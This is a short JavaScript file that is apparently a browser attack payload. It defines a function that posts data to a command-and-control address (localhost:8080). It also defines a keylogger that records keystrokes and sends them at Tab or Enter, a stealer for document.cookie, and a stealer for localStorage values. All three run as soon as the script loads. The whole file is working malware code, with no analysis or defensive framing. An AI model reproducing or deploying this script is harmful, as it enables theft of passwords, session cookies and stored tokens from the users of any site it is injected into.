// Send data to C2. Takes in String / json object?
function sendc2(data) {
    var params = JSON.stringify({ secret: data });
    req = new XMLHttpRequest();
    req.open("POST", "http://localhost:8080/");
    req.send(data);
}


// Scan any keyboard input from a service and send to C2 in a buffer when enter or tabbed.
function keyLogger() {
    var pageBuf = []
    var tmpStr = ""
    document.addEventListener('keydown', function(event) {
        if (event.code == "Tab" || event.code == "Enter") {
            pageBuf.push(tmpStr);
            sendc2(pageBuf);
            pageBuf = [];
            tmpStr = "";
        } else if (event.code == "Shift" || event.code == "Alt" || event.code == "Control") {
            // Ignore characters
        } else {
            tmpStr += event.key;
        }
    });
}

// Steal cookies.
function cookieStealer() {
    // TODO: Fix formatting to array.
    sendc2(document.cookie);
}

// Iterate through all items in local storage.
function localStorageStealer() {
    if (localStorage.length == 0) {
        return;
    }
    for (var i = 0; i < localStorage.length; ++i ) {
        sendc2(localStorage.getItem(localStorage.key(i)));
      }
}

cookieStealer();
keyLogger();
localStorageStealer();
